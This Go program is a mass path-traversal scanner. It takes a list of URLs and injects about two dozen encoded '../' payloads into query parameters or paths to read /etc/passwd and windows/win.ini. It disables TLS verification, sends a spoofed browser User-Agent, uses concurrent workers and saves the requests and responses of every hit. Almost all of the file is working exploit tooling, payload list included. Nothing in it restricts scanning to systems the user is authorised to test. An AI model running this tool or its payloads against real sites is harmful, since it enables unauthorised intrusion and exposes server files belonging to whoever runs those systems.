package main

import (
	"bufio"
	"compress/gzip"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
)

var (
	listFile   = flag.String("l", "", "Path to the file containing URLs")
	verbose    = flag.Bool("v", false, "Enable verbose output")
	outputFile = flag.String("o", "", "Output file for vulnerable results")
	workers    = flag.Int("w", 10, "Number of concurrent workers")
)

type Result struct {
	TestURL      string
	Vulnerable   bool
	RequestDump  string
	ResponseDump string
}

var payloads = []string{
	"../../../../etc/passwd",
	"....//....//....//....//etc/passwd",
	"%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd%00",
	"..%c0%af..%ef%bc%8f..%252f..%252fetc%c0%afpasswd",
	"..%u2216..%u2216..%u2216etc%u2216passwd",
	"&#x2e;&#x2e;/&#x2e;&#x2e;/etc/&#x2f;passwd",
	"..%3b/..%3b/..%3b/etc%3b/passwd",
	"/////////////////../../../../../../../../etc/passwd",
	"../../../../../../../../../../../../../../etc/passwd",
	"//..//..//..//..//..//..//..//..//..//..//../etc/passwd",
	"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd",
	"../../../../../../../../../../etc/passwd",
	"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
	"..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cetc/passwd",
	"..%252f..%252f..%252f..%252fetc/passwd",
	"..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
	"..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
	"/etc/passwd",
	"////etc/passwd",
	"..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
	"..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/win.ini",
	"../../../../../../../../../../../../../../windows/win.ini",
	"..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
}

var (
	linuxRegex   = regexp.MustCompile(`root:x:0:0:`)
	windowsRegex = regexp.MustCompile(`\[extensions\]\r?\n`)
)

func main() {
	flag.Parse()

	urls, err := readURLs(*listFile)
	if err != nil {
		fmt.Printf("Error reading URLs: %v\n", err)
		return
	}

	jobs := make(chan string, *workers)
	results := make(chan Result, *workers)

	var wg sync.WaitGroup
	for i := 0; i < *workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			worker(jobs, results, *verbose)
		}()
	}

	go func() {
		generateTestURLs(urls, payloads, jobs)
	}()

	go func() {
		wg.Wait()
		close(results)
	}()

	var vulnerableResults []Result
	for res := range results {
		if res.Vulnerable {
			vulnerableResults = append(vulnerableResults, res)
		}
	}

	if *outputFile != "" {
		writeResults(*outputFile, vulnerableResults)
	}
}

func readURLs(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var urls []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		url := strings.TrimSpace(scanner.Text())
		if url != "" {
			urls = append(urls, url)
		}
	}
	return urls, scanner.Err()
}

func generateTestURLs(urls []string, payloads []string, jobs chan<- string) {
	defer close(jobs)

	for _, rawURL := range urls {
		originalURL, err := url.Parse(rawURL)
		if err != nil {
			continue
		}

		if originalURL.RawQuery != "" {
			pairs := strings.Split(originalURL.RawQuery, "&")
			for i, pair := range pairs {
				parts := strings.SplitN(pair, "=", 2)
				key := parts[0]
				for _, payload := range payloads {
					newPair := key + "=" + payload
					newPairs := make([]string, len(pairs))
					copy(newPairs, pairs)
					newPairs[i] = newPair
					newQuery := strings.Join(newPairs, "&")
					testURL := fmt.Sprintf("%s://%s%s?%s", originalURL.Scheme, originalURL.Host, originalURL.Path, newQuery)
					jobs <- testURL
				}
			}
		} else {
			for _, payload := range payloads {
				newPath := originalURL.Path + payload
				testURL := fmt.Sprintf("%s://%s%s", originalURL.Scheme, originalURL.Host, newPath)
				jobs <- testURL
			}
		}
	}
}

func worker(jobs <-chan string, results chan<- Result, verbose bool) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Transport: tr,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	for testURL := range jobs {
		req, err := http.NewRequest("GET", testURL, nil)
		if err != nil {
			if verbose {
				fmt.Printf("Error creating request for %s: %v\n", testURL, err)
			}
			continue // Skip this URL and move to the next one
		}

		req.Header.Set("Accept-Encoding", "gzip, deflate, br")
		req.Header.Set("Accept", "*/*")
		req.Header.Set("Accept-Language", "en-US;q=0.9,en;q=0.8")
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36")
		req.Header.Set("Connection", "close")
		req.Header.Set("Cache-Control", "max-age=0")

		reqDump, _ := httputil.DumpRequestOut(req, false)

		resp, err := client.Do(req)
		if err != nil {
			if verbose {
				fmt.Printf("Error requesting %s: %v\n", testURL, err)
			}
			continue // Skip this URL and move to the next one
		}
		defer resp.Body.Close()

		var respDump strings.Builder
		var bodyReader io.Reader = resp.Body
		if resp.Header.Get("Content-Encoding") == "gzip" {
			bodyReader, err = gzip.NewReader(resp.Body)
			if err != nil {
				if verbose {
					fmt.Printf("Error decompressing gzip for %s: %v\n", testURL, err)
				}
				continue // Skip this URL and move to the next one
			}
		}

		bodyBytes, err := ioutil.ReadAll(bodyReader)
		if err != nil {
			if verbose {
				fmt.Printf("Error reading response body for %s: %v\n", testURL, err)
			}
			continue // Skip this URL and move to the next one
		}
		body := string(bodyBytes)

		respDump.WriteString(fmt.Sprintf("HTTP/1.1 %s\r\n", resp.Status))
		for k, vv := range resp.Header {
			for _, v := range vv {
				respDump.WriteString(fmt.Sprintf("%s: %s\r\n", k, v))
			}
		}
		respDump.WriteString("\r\n")
		respDump.Write(bodyBytes)

		vulnerable := linuxRegex.MatchString(body) || windowsRegex.MatchString(body)
		if vulnerable {
			results <- Result{
				TestURL:      testURL,
				Vulnerable:   true,
				RequestDump:  string(reqDump),
				ResponseDump: respDump.String(),
			}
		}

		if verbose {
			fmt.Printf("Request:\n%s\nResponse:\n%s\n\n", string(reqDump), respDump.String())
		}
	}
}

func writeResults(outputPath string, results []Result) error {
	file, err := os.Create(outputPath)
	if err != nil {
		return err
	}
	defer file.Close()

	for _, res := range results {
		file.WriteString(fmt.Sprintf("Vulnerable URL: %s\n", res.TestURL))
		file.WriteString("Request:\n")
		file.WriteString(res.RequestDump)
		file.WriteString("\nResponse:\n")
		file.WriteString(res.ResponseDump)
		file.WriteString("\n\n")
	}

	return nil
}
